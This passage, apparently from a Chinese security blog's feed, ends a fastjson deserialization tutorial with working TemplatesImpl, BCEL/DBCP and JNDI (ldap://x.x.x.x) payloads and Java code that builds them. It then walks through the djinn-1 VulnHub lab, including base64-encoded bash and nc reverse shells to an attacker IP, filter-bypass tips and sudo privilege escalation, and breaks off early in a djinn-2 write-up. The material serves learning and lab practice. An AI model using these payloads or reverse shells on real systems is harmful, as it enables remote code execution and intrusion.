class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>        </span><br><span class="line">&#125;,    </span><br><span class="line"><span class="string">&quot;b&quot;</span>: &#123;        </span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,        </span><br><span class="line"><span class="string">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHACQBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAlAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACYBAApTb3VyY2VGaWxlAQAJQ2FsYy5qYXZhDAALAAwHACcMACgAKQEAEGphdmEvbGFuZy9TdHJpbmcBAANjbWQBAAIvYwEABGNhbGMMACoAKwEABENhbGMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAgACgAAAAAABAABAAsADAACAA0AAAA/AAUAAQAAAB8qtwABuAACBr0AA1kDEgRTWQQSBVNZBRIGU7YAB1exAAAAAQAOAAAADgADAAAACgAEAAsAHgAMAA8AAAAEAAEAEAABABEAEgABAA0AAAAZAAAABAAAAAGxAAAAAQAOAAAABgABAAAADwABABEAEwACAA0AAAAZAAAAAwAAAAGxAAAAAQAOAAAABgABAAAAEQAPAAAABAABABQACQAVABYAAgANAAAAJQACAAIAAAAJuwAIWbcACUyxAAAAAQAOAAAACgACAAAAEwAIABQADwAAAAQAAQAXAAEAGAAAAAIAGQ==&quot;</span>],        </span><br><span class="line"><span class="string">&#x27;_name&#x27;</span>: <span class="string">&#x27;a.b&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;_tfactory&#x27;</span>: &#123;&#125;,        </span><br><span class="line"><span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;,        </span><br><span class="line"><span class="string">&quot;_name&quot;</span>: <span class="string">&quot;b&quot;</span>,        </span><br><span class="line"><span class="string">&quot;_version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,        </span><br><span class="line"><span class="string">&quot;allowedProtocols&quot;</span>: <span class="string">&quot;all&quot;</span>      </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095222.png" alt="image-20211104154502529"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095226.png" alt="image-20211104155156057"></p><h3 id="DBCP的利用"><a href="#DBCP的利用" class="headerlink" title="DBCP的利用"></a>DBCP的利用</h3><blockquote><p>tomcat有一个tomcat-dbcp.jar组件是tomcat用来连接数据库的驱动程序存在一个org.apache.tomcat.dbcp.dbcp.BasicDataSource类，类中Class.forName可将driverClassLoader和driverClassName设置为json指定的内容，并通过传参数执行代码。通过Class.forName传入BCEL编码的evil.class文件，com.sun.org.apache.bcel.internal.util.ClassLoader的classloader会先把它解码成一个byte[]，然后调用defineClass还原出恶意Class，执行任意代码。于是根据fastjson漏洞逻辑，控制Class.forName加载的类和ClassLoader，加载还原出的恶意Class执行代码。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095230.png" alt="image-20211104114501433"></p><p>而且对于不同的Tomcat版本使用的poc也不同：</p><p>• Tomcat 8.0以后使用<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p><p>• Tomcat 8.0以下使用<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code></p><p>新建 poc_1 类，代码如下，并执行 <code>javac poc_1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编码poc_1类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBCEL</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;        </span><br><span class="line">        Path path = Paths.get(<span class="string">&quot;poc_1.class&quot;</span>);        </span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(path);        </span><br><span class="line">        System.out.println(bytes.length);        </span><br><span class="line">        String result = Utility.encode(bytes,<span class="keyword">true</span>);        </span><br><span class="line">        BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(<span class="string">&quot;res.txt&quot;</span>));        </span><br><span class="line">        bw.write(<span class="string">&quot;$$BCEL$$&quot;</span> + result);        </span><br><span class="line">        bw.close();    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将生成的 BCEL编码 替换到 driverClassName</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;    </span><br><span class="line">&quot;a&quot;: &#123;        </span><br><span class="line">&quot;@type&quot;: &quot;java.lang.Class&quot;,        </span><br><span class="line">&quot;val&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;    </span><br><span class="line">&#125;,    </span><br><span class="line">&quot;b&quot;: &#123;        </span><br><span class="line">&quot;@type&quot;: &quot;java.lang.Class&quot;,        </span><br><span class="line">&quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;    </span><br><span class="line">&#125;,    </span><br><span class="line">&quot;c&quot;: &#123;        </span><br><span class="line">&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,        </span><br><span class="line">&quot;driverClassLoader&quot;: &#123;            </span><br><span class="line">&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;       </span><br><span class="line">&#125;,        </span><br><span class="line">&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3d$D$94$96Z$e4$r$f8De$r$b0$90$98$b8$c3$b81$9a$YQ$8c$Q$5d$9aa$9c$90biI$v$86$3fr$cd$G$8d$L$3f$c0$8f2$de$99$Y$qq$W$f7q$ee9$e7$ce$cc$d7$f7$c7$t$80cTlX$c8$db$u$60$cdBQ$e5$92$89u$h$G6Ll$9a$d8bH$9e$b8$be$h$9d2$c4$ab$b5$7b$86$c4Y$f0$q$Z2$z$d7$977$93aO$86$5d$de$f3$I$b1N$84$f7$cbLw$o$$$9e$af$f9H$8f$c8$90$c1$ee$E$93P$c8$LWQ$edQ$m$k$8f$O$H$fc$85$3bH$c16$b1$ed$60$Her$X$dc$T$Ov$b1$c7PP$f3$86$h4$$$db$e7S$nG$91$h$f8$O$f6a3$Y$da$80$n$ab$v$k$f7$fb$8dvo$mE$c4$90$fb$83$ee$s$7e$e4$O$d5$be$be$8c$WM$b1Zk$fd$e34i$b5$9cJ$c1pP$5d$9av$a2$d0$f5$fb$cde$c1m$Y$I9$k$93$m3$a2a$a4$9f$da$N$b9$90$a8$c0$a4$dfT$t$G$a6$deEq$85$ba2eF$d9$a8$bf$81$cd$a8$60p$u$s5$Y$tIzAmk$v$90$7fG$y$l$9f$p$f1$f0$K$eb$aa$3eGr$a6$f1$U$v$N$e2$u$7d$89$w$e5$92$d2$a8I$$$Wr$e4$b4J$a8$89X$cbD$sA$a2$ac$beO$ee$H$bd$d2$f4$3a$f3$B$A$A&quot;    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095234.png" alt="image-20211105113501574"></p><blockquote><p>在不出网的场景下，如果获取到了网站的根目录，可以通过写入webshell的方式进行攻击，或写入内存shell。参考文章：<a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652483033&idx=1&sn=de56f90d39d418c2795719814c827786&scene=21#wechat_redirect">Springboot 内存shell</a></p></blockquote><h2 id="POC总结"><a href="#POC总结" class="headerlink" title="POC总结"></a>POC总结</h2><ul><li>fastjson &lt;= 1.2.24          <code>AutoType=true</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://x.x.x.x:9999/Shell&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>1.2.25 &lt;= fastjson &lt;= 1.2.47   <code>AutoType=false</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://x.x.x.x:1098/jndi&quot;</span>, </span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注：针对fastjson服务器所处系统的不同操作版本，要用不同的命令执行语句</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>djinn-1靶机练习</title>
      <link href="2023/11/28/djinn-1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>2023/11/28/djinn-1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong>靶机位置</strong>：<a href="https://www.vulnhub.com/entry/djinn-1,397/">https://www.vulnhub.com/entry/djinn-1,397/</a></p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112102311288.png" alt="image-20210112102311288"></p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 192.168.56.108</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112102434112.png" alt="image-20210112102434112"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112102503178.png" alt="image-20210112102503178"></p><h2 id="ftp枚举"><a href="#ftp枚举" class="headerlink" title="ftp枚举"></a>ftp枚举</h2><p>ftp可以匿名访问，查看到三个文件，说1337是他写的游戏，写给朋友玩的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://192.168.56.108</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112102555274.png" alt="image-20210112102555274"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112102728037.png" alt="image-20210112102728037"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112102752159.png" alt="image-20210112102752159"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112102810180.png" alt="image-20210112102810180"></p><h2 id="natcat访问"><a href="#natcat访问" class="headerlink" title="natcat访问"></a>natcat访问</h2><p>http访问1337不行，试试 <code>nc 192.168.56.108 1337</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112103040244.png" alt="image-20210112103040244"></p><p>结果这游戏是小学生数学题，还要玩一千次才有礼物！？？？(ﾒ｀ﾛ´)/</p><p>再尝试访问7331端口，发现有网页</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112103709542.png" alt="image-20210112103709542"></p><h2 id="gobuster爆破目录"><a href="#gobuster爆破目录" class="headerlink" title="gobuster爆破目录"></a>gobuster爆破目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.108:7331 -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112105840511.png" alt="image-20210112105840511"></p><p>两个目录，/wish 和 /genie</p><blockquote><p>之前发现了一款dirb目录扫描工具，这次用的时候只发现了/genie目录，很奇怪，为什么啊，明明很好用的</p></blockquote><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112104603511.png" alt="image-20210112104603511"></p><p>试着执行 ifconfig ，跳转到这个页面，可以看到执行成功，返回了正确的信息，看不清可以f12查看源代码</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112104714347.png" alt="image-20210112104714347"></p><p>好，接下来就是反弹shell</p><p>用 bash -i &gt;&amp; /dev/tcp/192.168.56.123/1234 0&gt;&amp;1 尝试了一下发现没反应，思路会不会是有防护被过滤掉了，于是试一下base64编码，成功反弹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEyMy8xMjM0IDA+JjE= | base64 -d | bash</span><br></pre></td></tr></table></figure><blockquote><p>必须要添加解码的语句和bash环境</p></blockquote><p>试一下nc能不能弹，rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.123 4444 &gt;/tmp/f</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC41Ni4xMjMgNDQ0NCA+L3RtcC9m | base64 -d | bash</span><br></pre></td></tr></table></figure><p>这个环境更佳，直接进bash，刚才上面的弹回来还会有乱码出现，输一个数出两个重复的数，还是这个好啊，但是按删除键还是会出现^H^H^H^H^H^H 只能控制自己不要输错，然后我python -c ‘import pty;pty.spawn(“/bin/bash”)’ 又变成重复的数字输入了。。。</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112111200105.png" alt="image-20210112111200105"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /nitish</span><br><span class="line">ls -lsa    <span class="comment"># 查看隐藏文件</span></span><br><span class="line"><span class="built_in">cd</span> .dev</span><br><span class="line">cat creds.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112120146140.png" alt="image-20210112120146140"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">su nitish  <span class="comment"># 密码 p4ssw0rdStr3r0n9</span></span><br></pre></td></tr></table></figure><h3 id="sudo-l-查看权限"><a href="#sudo-l-查看权限" class="headerlink" title="sudo -l 查看权限"></a>sudo -l 查看权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112132830962.png" alt="image-20210112132830962"></p><p>我们发现用户Nitish可以执行genie二进制文件而无需用户sam的任何密码。使用此命令，我们成功管理或获得了sam用户的外壳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u sam /usr/bin/genie -cmd id</span><br><span class="line">bash</span><br></pre></td></tr></table></figure><blockquote><p>这里为什么直接-cmd了呢？？？上面的usage后面有参数：-h -g -p SHELL -e EXEC</p><p>于是sudo -u sam /usr/bin/genie -h 查看使用说明，没看到啥</p><p>再用strings查看/usr/bin/genie文件的内容</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210112141642104.png" alt="image-20210112141642104"></p><p>再用 man /usr/bin/genie 查看使用帮助，也看到了上图的一些命令</p><p>于是接下来就开始尝试，先获取shell试试，<code>sudo -u sam /usr/bin/genie -p &quot;/bin/bash&quot;</code> ,并没有得到sam的shell，再试下 -cmd 得到了权限</p></blockquote><p>再次枚举sudo权限，发现Sam用户可以以root权限执行/root/log</p><p>那就试一下跟上一个靶机一样的方式</p><ul><li></li><li>这次提权不是内核、CVE等提权，而是ctf那类，先查找到一个用户的密码，su过去，利用sudo -l查找具有sudo且不需要密码的用户可执行的文件，再利用这个文件获取另一个用户的权限，多试了几次这种查询之后，最终找到了具有root的权限文件，再想办法获取到root的权限。</li><li>gobuster是一个新的目录爆破工具</li><li>命令执行漏洞反弹shell的时候可能会有过滤语句限制，要想办法绕过，比如base64加密。 <code>echo xxxxxxx | base64 -d | bash</code></li></ul><p>下面两个是进行绕过的技巧参考：</p><ul><li>先知社区：<a href="https://xz.aliyun.com/t/3918">Bypass一些命令注入限制的姿势</a></li><li>Github：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>1、<a href="https://www.hacknos.com/djinn-1-vulnhub-walkthrough/">https://www.hacknos.com/djinn-1-vulnhub-walkthrough/</a></p><p>2、<a href="https://blog.csdn.net/weixin_44214107/article/details/103346553">https://blog.csdn.net/weixin_44214107/article/details/103346553</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> 内网提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>djinn-2靶机练习</title>
      <link href="2023/11/28/djinn-2%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>2023/11/28/djinn-2%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong>靶机位置</strong>：<a href="https://www.vulnhub.com/entry/djinn-2,420/">https://www.vulnhub.com/entry/djinn-2,420/</a></p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">netdiscover</span><br><span class="line">nmap -sP 192.168.56.0/24</span><br></pre></td></tr></table></figure><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 192.168.56.109</span><br></pre></td></tr></table></figure><p>同样发现了与靶机1一样的ftp匿名登录，里面也是三个文件，文件名一样，不过内容变了</p><table><thead><tr><th>port</th><th>state</th><th>service</th></tr></thead><tbody><tr><td>21</td><td>open</td><td>ftp</td></tr><tr><td>22</td><td>open</td><td>ssh</td></tr><tr><td>1337</td><td>open</td><td>waste</td></tr><tr><td>5000</td><td>open</td><td>upnp</td></tr><tr><td>7331</td><td>open</td><td>swx</td></tr></tbody></table><p>这个7331端口和上一个靶机一样，再打开/wish页面，它提示漏洞已修复，也确实没有命令执行漏洞了，两个靶机怎么可能同一处利用点呢，只能尝试其他点了</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.109:7331 /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure><blockquote><ul><li><a href="http://192.168.56.109:7331/robots.txt">http://192.168.56.109:7331/robots.txt</a> (CODE:200|SIZE:10)</li><li><a href="http://192.168.56.109:7331/source">http://192.168.56.109:7331/source</a> (CODE:200|SIZE:1280)</li><li><a href="http://192.168.56.109:7331/wish">http://192.168.56.109:7331/wish</a> (CODE:200|SIZE:456)</li></ul></blockquote><p>扫描到了一个新目录/source,一访问结果下载下来了</p><p>source内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://&#123;&#125;:5000/?username=&#123;&#125;&amp;password=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span>(<span class="params">ip: <span class="built_in">str</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Check whether the input IP is valid or not</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r&#x27;^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])&#x27;</span></span><br><span class="line"></span><br><span class="line">                <span class="string">&#x27;(\.(?!$)|$))&#123;4&#125;$&#x27;</span>, ip):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span 